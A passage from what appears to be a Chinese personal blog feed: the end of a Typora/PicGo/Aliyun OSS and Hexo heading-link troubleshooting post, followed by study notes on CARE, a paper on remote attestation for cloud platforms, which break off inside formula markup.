src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210160951163.png" alt="image-20241210160951163"></p><p>接下来输入用户名称，并且打开控制台访问和永久AccessKey访问。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210161129801.png" alt="image-20241210161129801"></p><p>之后进入用户，创建AccessKey</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210162123722.png" alt="image-20241210162123722"></p><p>这样就好了，接下来打开Typora，点击文件——偏好设置——图像</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210163217920.png" alt="image-20241210163217920"></p><p>下载好PicGo-Core之后打开配置文件</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210163336417.png" alt="image-20241210163336417"></p><p>uploader为aliyun这个不用改，更改accessKeyId，accessKeySecret为刚刚申请的。bucket填你创建的bucket名称，area应该都一样，path为在bucket下创建的那个目录的名称。customUrl需要我们查询一下bucket概览，在最后一个表格里将这个地址添加上<code>https://</code>即可</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210163618986.png" alt="image-20241210163618986"></p><p>保存后退出配置成功。</p><h1 id="文章内目录一级标题无跳转问题">文章内目录一级标题无跳转问题</h1><p>这个问题也困扰我很久了，我一直以为是之前爆改博客的时候把主题配置文件的css改了，但是重新装了一次主题之后问题还是存在。</p><p>之后我又想着可能是hexo版本太低了，又更新了一次版本。</p><p>按照<a href="https://segmentfault.com/a/1190000013945636">node.js - Hexo重装与位置移动</a>中所说，先创建一个新文件夹，然后使用git bash在新文件夹中执行如下操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install -g hexo-cli<br>hexo init<br>npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>之后修改hexo目录下的_config.yml文件即可，老生常谈了，这里就不说了。</p><p>然后重新下载butterfly主题并在hexo目录下的_config.yml文件设置主题为butterfly。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly<br>npm install hexo-renderer-pug hexo-renderer-stylus --save<br></code></pre></td></tr></table></figure><p>之后将butterfly主题中的_config.yml文件配置好之后好了一阵子，但是之后还是出现这种情况。</p><p>思考了一下，觉得可能是渲染器的问题，因为前后的不同之处也差不多就只有渲染器因为公式的问题被我改成了markdown-it。</p><p>最后迫不得已，尝试了一下markdown-it-plus来在hexo使用katex，但是还是失败了。</p><p>之后换成mathjax渲染公式，使用hexo-renderer-kramed渲染器渲染整个博客，最后还是失败告终。</p><p>一直到现在也没得出解决方案，希望有大佬能帮我看看怎么解决。</p><blockquote><p>后记：被自己蠢哭了，在全局yaml中添加的配置：</p><p>anchors:<br>level: 2</p><p>这里的level: 2就是指从二级目录开始添加链接，只要将其改成1就行。这么简单的东西困扰了我好几个月，真被自己蠢哭了。</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>可信计算论文学习集</title>
    <link href="/2024/11/21/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0%E9%9B%86/"/>
    <url>/2024/11/21/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>根本不能分辨哪些论文是好论文</p><span id="more"></span><h1 id="CARE">CARE</h1><h2 id="Abstract">Abstract</h2><p>该方法是一种云平台可信性验证的新方法。提出了基于多个验证者远程认证的方法。</p><p>CARE旨在提高远程认证的实用性和效率，并解决涉及多个利益相关者的环境中的安全和信任问题。</p><ul><li>采用群体验证的概念，采用多个验证者的循环协作模型来收集和验证证据，从而解决信任问题，提高验证效率。</li><li>引入了精心设计的过滤机制，以非侵入式方式解决验证结果中的误报问题。</li><li>采用多向树形结构来构建基线值库，从而增强了系统的灵活性和细粒化管理能力。</li></ul><p>CARE 可解决因应用层激活完整性测量架构 (<code>IMA</code>) 而导致远程验证结果不准确的首个实用解决方案。</p><h3 id="知识补充">知识补充</h3><h3 id="什么是基线值库（Baseline-Value-Library）？">什么是基线值库（Baseline Value Library）？</h3><p><strong>基线值</strong>是系统中某些关键对象（如文件、配置项、内核模块等）在可信状态下的参考值。这些值可以是文件的哈希值或签名（如 SHA-256 哈希）、系统配置项的参数值（如安全策略、网络规则）、应用程序的版本信息、运行环境的状态描述等</p><h3 id="什么是完整性测量架构（IMA）？">什么是完整性测量架构（IMA）？</h3><ul><li><p><strong>IMA 的作用</strong>是测量系统中关键组件（如内核模块、文件、应用程序等）的完整性，并生成对应的哈希值。这些哈希值会被记录在日志中或存储到 <code>TPM</code>（可信平台模块）的 <code>PCR</code>（平台配置寄存器）中。</p></li><li><p>远程验证通常通过获取这些测量值并比对预期的值，来检查系统是否被篡改。</p></li></ul><h3 id="什么是应用层激活-IMA？">什么是应用层激活 IMA？</h3><ul><li><strong>激活 IMA</strong> 是指触发 <code>IMA </code>来对某些对象（如文件、程序）进行完整性测量。</li><li><strong>应用层激活 IMA</strong> 是指这种触发是由应用层的操作导致的，例如某个应用程序读取文件或加载模块时触发了 <code>IMA</code>的测量。</li></ul><h3 id="为什么会导致远程验证不准确？">为什么会导致远程验证不准确？</h3><ol><li><p><strong>测量结果的不一致性：</strong></p><p>如果测量是在应用层动态触发的，不同时间、不同条件下激活<code>IMA</code>，测量的结果可能会受运行时的上下文影响。例如，某些动态生成的文件或临时文件在测量时的哈希值可能会变化，导致测量值与预期不一致。</p></li><li><p><strong>不可预测的测量值：</strong></p><p>应用层的操作有时会访问文件或模块，这些访问可能并不总是按照固定顺序进行。这种不确定性会导致测量值的顺序和内容与预期值不符，影响远程验证。</p></li><li><p><strong>测量与预期范围不一致：</strong></p><p>远程验证通常依赖于预定义的策略来验证特定对象（如内核或关键配置文件）。应用层触发<code>IMA</code>后，可能测量了额外的、非关键的对象，或者没有测量到策略要求的对象，从而导致远程验证失败。</p></li><li><p><strong>动态数据的测量问题：</strong></p><p>应用层可能涉及动态生成的数据（如日志、缓存文件）。这些数据的完整性测量在远程验证时可能没有意义，因为其哈希值会随时间或操作而变化。</p></li></ol><h2 id="Introduction">Introduction</h2><h3 id="深度学习即服务-DLaaS">深度学习即服务(DLaaS)</h3><p><strong>DLaaS</strong>（<strong>Deep Learning as a Service</strong>）是一种基于云计算平台的服务模型，它允许用户通过云端提供的深度学习基础设施、算法和工具来进行模型训练、推理和开发，而无需自行配置和管理硬件资源。</p><p>在<code>DLaaS</code>的生态系统中，有多个服务提供者，每个都有不同的角色，如模型提供者、计算提供者和应用程序提供者，协作提供专门的服务。</p><p><strong>缺点</strong>：多方的参与和公共云环境中的操作导致数据和模型提供商在将他们的知识产权上传到云时犹豫不决，担心他们的知识产权被泄露或滥用。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241121194556998.png" alt="image-20241121194556998"></p><ul><li><p><strong>解决1</strong>：</p><p>如同态加密(<code>HE</code>)和安全多方计算(<code>MPC</code>)等隐私计算技术提供了一些安全措施。局限性：内存计算期间的攻击风险，并且这两种方法都要求模型和数据集提供者完全信任执行计算任务的云平台。</p></li><li><p><strong>解决2</strong>：</p><p>远程证明机制可解决云平台的可信度问题</p></li></ul><h3 id="远程证明-RA">远程证明(RA)</h3><p><strong>RA（Remote Attestation）</strong> 是一种用于验证和评估远程系统（如服务器、物联网设备、虚拟机等）可信状态的技术。它通过向验证方（通常是管理系统或信任中心）提供系统的可信状态证明，确保远程设备没有被篡改或受到攻击，从而建立信任关系。</p><ol><li><p><strong>单个验证器</strong></p><p>缺点：集中式验证模式，容易造成瓶颈，尤其是延迟。</p></li><li><p><strong>蜂群验证机制</strong></p><p>优点：缩短了总验证时间，规避了单个验证器可能存在的拥堵。</p><p>缺点：主要应用于物联网（<code>IoT</code>）场景，很难迁移到云环境。</p></li></ol><p><strong>缺点</strong>：<code>IMA</code> 测量所有二进制文件加载、模块加载和动态链接库加载，并将指标记录在日志中。因此，即使是生命周期极短的文件也会被测量和记录。记录生命周期极短的文件可能会对验证结果的精确性产生不利影响。</p><h2 id="Related-Work">Related Work</h2><p>深度学习系统安全和虚拟机可信状态证明的相关工作</p><h3 id="Deep-Learning-System-Security">Deep Learning System Security</h3><ul><li><p>基于隐私计算技术</p><p>优点：隐私保护方法可以防止模型窃取和篡改。</p><p>缺点：可能存在计算速度和准确性降低等问题。</p></li><li><p>利用安全的执行环境进行系统保护</p><p>优点：提供了可信的执行环境，有效地防止了代码和数据泄漏</p><p>缺点：受有限的可信内存的限制，因此很难确保在数据的存储、传输和计算生命周期中提供全面保护。</p></li></ul><h3 id="Hardware-based-Remote-Attestation">Hardware-based Remote Attestation</h3><p>基于硬件的证明依赖于物理芯片和模块，如<code>TPM</code>和Intel <code>SGX</code>，以提供高级别的安全性。</p><p><code>TPM</code>支持安全存储和计算。<code>SGX</code> 通过硬件确保应用程序的机密性和完整性，然而，<code>SGX</code>依赖于物理CPU，由于硬件环境的变化，在<code>VM</code>迁移期间会带来挑战。</p><p>在云环境中，验证虚拟机的可信性需要同时验证虚拟机、主机和管理程序，这叫做虚拟机深度验证。<code>TCG</code>提出的分段测量框架将虚拟机与主机验证分开，但这种方法存在冗余问题。</p><p>当多台虚拟机运行在同一台主机上时，对每台虚拟机进行远程验证需要重复收集主机证据，效率较低。</p><blockquote><p>TVP-PCA</p><ul><li>优点：使用信任链和MAC地址算法解决了身份问题。通过验证测量日志和PCR值提供更高的准确性，从而能够识别受损设备并精确定位受影响的组件</li><li>不足：无法解决主机证据收集过多的问题。</li></ul></blockquote><blockquote><p>CloudTA</p><p>该框架将同一主机上所有vm的测量扩展到同一寄存器，从而实现组验证。</p><ul><li>优点：提高了验证效率，解决了冗余问题。通过验证测量日志和PCR值提供更高的准确性，从而能够识别受损设备并精确定位受影响的组件</li><li>不足：无法对虚拟机内部状态进行针对性的验证，无法判断应用的可信启动状态。</li></ul></blockquote><p>随着RA的应用增多，传统集中式验证模式难以适应。<code>蜂群认证</code>成为解决方案，通过广播或分层结构，高效服务多个节点。</p><p>广播适用于网络拓扑变化频繁但通信开销高且容易发生广播风暴的场景。</p><p>分层认证更适合具有不同资源能力的设备集群。</p><blockquote><p>ESDRA</p><ul><li>优点：分布式设计减少了时间开销。</li><li>缺点：多个邻居同时对单个证明者进行认证会增加计算和内存成本。只包含设备的最终哈希值，无法精确定位到组件。</li></ul></blockquote><blockquote><p>SARA</p><ul><li>优点：保证物联网设备上运行的软件的安全性。</li><li>缺点：集中认证机制需要将整个设备组的证据报告给验证方，导致证据数据量随着服务数量的增加呈线性增长。只包含设备的最终哈希值，无法精确定位到组件。</li></ul></blockquote><blockquote><p>FeSA</p><p>第一个将机器学习应用于群体认证方案</p><ul><li>优点：验证者根据其行为识别可疑设备并执行证明，从而减少了证明者的开销。</li><li>缺点：由于机器学习算法固有的假阳性和假阴性率，设备状态评估的准确性有待进一步研究。</li></ul></blockquote><blockquote><p>DeepTrust</p><p>也是使用机器学习来评估物联网设备的可信度。</p></blockquote><p>为了缓解依赖于单个验证者的远程认证方案可能面临单点故障的风险，基于第三方服务的远程认证解决方案利用<code>SGX</code>来确保验证过程的安全性。</p><blockquote><p>DVRA</p><ul><li>优点：</li><li>缺点：SGX封装的内存限制和频繁的分页操作严重影响了大规模认证任务的效率。</li></ul></blockquote><blockquote><p>ZKSA</p><p>一个基于零知识证明（ZKP）的去中心化远程认证协议</p><ul><li>优点：支持证明者和多个验证者之间的非交互式验证过程，增强了认证过程的安全性。</li><li>缺点：计算开销大，设备要求高。</li></ul></blockquote><p>总的来说，上述方案不考虑设备退出，只部分考虑新设备加入。群体认证模式可以有效地评估集群的可信度，但由于结果聚集，无法推断单个节点的内部状态。ZKSA、DVRA、ESDRA和SARA在脱机阶段部署软件，但在程序启动时缺乏完整性检查。分段认证方法可以验证虚拟机的可信性，但存在主机信息收集过多的问题。基于管理程序的并发认证确保虚拟机的可信引导，但在验证虚拟机内应用程序的可信度方面受到限制。</p><h4 id="零知识证明复习：">零知识证明复习：</h4><p><strong>零知识证明（Zero-Knowledge Proof, ZKP）</strong> 是一种密码学方法，允许证明者向验证者证明某件事是真实的，而<strong>无需透露证明过程中的任何额外信息</strong>。它的核心特点是确保隐私和安全，同时完成可信验证。</p><p><strong>零知识证明的三个关键特性</strong>：</p><ol><li><p><strong>完整性（Completeness）</strong><br>如果声明是真实的，诚实的证明者可以让验证者相信它是真实的。</p></li><li><p><strong>可靠性（Soundness）</strong><br>如果声明是假的，证明者无法欺骗验证者，使其相信声明是真实的。</p></li><li><p><strong>零知识性（Zero-Knowledge）</strong><br>验证者只能确认声明的真实性，但无法获取任何额外信息。</p></li></ol><h4 id="零知识证明的工作流程（简单例子）">零知识证明的工作流程（简单例子）</h4><ol><li><strong>声明</strong>：证明者宣布“某个命题为真”。</li><li><strong>挑战</strong>：验证者随机生成一个问题，要求证明者回答。</li><li><strong>响应</strong>：证明者基于其秘密知识回答问题。</li><li><strong>验证</strong>：验证者根据声明和规则验证证明者的答案是否符合条件。</li></ol><p>这个过程通常重复多次，以降低欺骗成功的概率。</p><h2 id="Overview">Overview</h2><p>介绍循环远程认证体系结构、安全假设、设计目标和攻击模型。</p><h3 id="Infrastructure-requirement">Infrastructure requirement</h3><p>基础设施要求（Infrastructure requirement）：</p><p>要求服务器配备<code>tpm</code>，而<code>vm</code>配备<code>vtpm</code>。</p><h3 id="Architecture">Architecture</h3><p>模型构建</p><h4 id="Cloud-Server-CS">Cloud Server (CS)</h4><p>过程步骤：</p><ol><li><p>每个云服务器和虚拟机必须主动注册CS的注册模块。</p></li><li><p>云服务器及其托管的虚拟机作为证明者，生成远程认证所需的证据信息。同时，云服务器还充当验证者。当需要提供远程认证服务时，云管理中心将验证者的基线值并发分发给指定的验证者。</p></li><li><p>验证者在指定的相邻云服务器及其上运行的所有虚拟机上执行远程认证操作。</p></li><li><p>验证方将认证结果上报给云平台管理中心。</p></li></ol><h4 id="Cloud-Management-Center-CMC">Cloud Management Center (CMC)</h4><p>由两个模块构成</p><ol><li><p>注册模块RM (Register Module)：</p><p>负责存储云服务器、虚拟机的<code>id</code>、<code>AIK公钥</code>和鉴权。</p></li><li><p>基线值库：</p><p>负责存储所有证明者的基线值。</p></li></ol><h3 id="Assumptions">Assumptions</h3><p>假设所有的云服务器都配备了硬件<code>tpm</code>，虚拟机拥有<code>vtpm</code>，云平台的管理中心是完全安全的。此外，CARE需要四个基本先决条件。</p><p>首先，尽管容易受到硬件攻击，如<code>TPM</code>回滚攻击、系统重启攻击和恶意<code>SMM</code>处理程序攻击，但假设云节点的<code>TPM</code>是安全的。这意味着安全密钥、非易失性内存RAM （<code>NVRAM</code>）和平台配置寄存器（<code>pcr</code>）不会受到破坏。</p><p>其次，攻击者不能模拟<code>TPM</code>软件、伪造认证结果或伪造数据签名，因为加密密钥的私钥是不可迁移的，并且由物理<code>TPM</code>保护。</p><p>第三，假设芯片生成的密钥、哈希值和伪随机数可以抵抗冲突或暴力攻击，因此重写或回滚物理<code>TPM</code>的<code>PCR</code>值在密码学上是不可行的。</p><p>第四，考虑了攻击者入侵虚拟机和云服务器的场景，目的是通过篡改核心操作系统组件来提升特权，同时排除了所有云服务器都被入侵的场景。</p><h3 id="Design-Goals">Design Goals</h3><h4 id="CARE的安全目标">CARE的安全目标</h4><ol><li>安全——重新设计的方案没有引入新的攻击面。例如，引入的过滤机制不会降低远程认证服务的安全性。</li><li>可信度——该方法应该验证多方参与的运行时环境的可信度，为深度学习服务提供受控的运行时环境。</li><li>完整性——该方法在启动时保护虚拟机内应用程序的完整性，防止文件修改攻击。</li></ol><h4 id="CARE的部署目标">CARE的部署目标</h4><ol><li>兼容性和稳定性——该方法应尽量减少对操作系统内核的修改，以防止中断用户业务运营和云服务可用性。</li><li>实用性——所提出的方法应该确保加载应用层程序时完整性验证的准确性。</li><li>可扩展性——随着虚拟机数量的增加，证明方法应该保持有效。</li></ol><h3 id="Attack-Model">Attack Model</h3><p>确定了两种主要的攻击类型:</p><ol><li>重放攻击，在这种攻击中，攻击者秘密地截取并向服务器重新发送用户数据包，而不为特定目的进行修改。</li><li>中间人(<code>MITM</code>)攻击，攻击者窃听网络通信，可能发送错误消息，导致拒绝服务或损坏。</li></ol><p>确定了两种攻击对象：</p><ol><li>恶意用户:恶意用户可能会通过修改某些文件来中断服务或运行环境，从而提升对系统的控制并实现他们的攻击目标。这些用户可能会通过修改现有记录或添加无效记录来破坏证据信息。</li><li>恶意服务提供商:作为平台所有者，他们有能力通过某些方式添加、修改或删除软件的信任链证据。恶意服务提供商可能为了商业利益或其他动机伪造或修改软件证据，甚至删除可能对他们不利的证据。</li></ol><h2 id="Remote-Attestation-Design">Remote Attestation Design</h2><p>主要分为系统设置和远程认证两个阶段</p><h3 id="System-setup">System setup</h3><h4 id="云节点注册（Cloud-Node-Registration）">云节点注册（Cloud Node Registration）</h4><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241122210918893.png" alt="image-20241122210918893"></p><p>为保证信息的准确性，在云节点内部署信息收集代理（information Collection Agent，<code>ICA</code>）进行信息收集。</p><ul><li>步骤1：云节点进行身份密钥注册，<code>ICA</code>向<code>RM</code>发送基本信息(节点<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>D</mi></mrow><annotation encoding="application/x-tex">ID</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span>、认证身份公钥(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>I</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">AIK_{pub}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>)和签名密钥公钥(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">EK_{pub}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>))。</li><li>步骤2a：<code>RM</code>将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>I</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">AIK_{pub}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">EK_{pub}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>绑定，并存储<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>D</mi></mrow><annotation encoding="application/x-tex">ID</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>I</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">AIK_{pub}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>。</li><li>步骤2b：<code>RM</code>生成随机数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">nonce</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span></span></span></span>(防止重放攻击)和会话密钥(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">ke</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span></span></span></span>)，然后按照等式(1)计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span>。</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>β</mi><mo>=</mo><mi>H</mi><mi>a</mi><mi>s</mi><mi>h</mi><mo stretchy="false">(</mo><mi>A</mi><mi>I</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(1)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">\beta=Hash(AIK_{pub}) \tag1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">1</span></span><span class="mord">)</span></span></span></span></span></span></p><ul><li>步骤2c：<code>RM</code>根据等式(2)计算密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">M_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>并发送至云节点</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msub><mi>M</mi><mn>1</mn></msub><mo>=</mo><msub><mi>E</mi><mrow><mi>E</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow></msub><mo stretchy="false">(</mo><mi>β</mi><mo separator="true">,</mo><mi>k</mi><mi>e</mi><mo separator="true">,</mo><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(2)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">M_1=E_{EK_{pub}}(\beta,ke,nonce)\tag2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 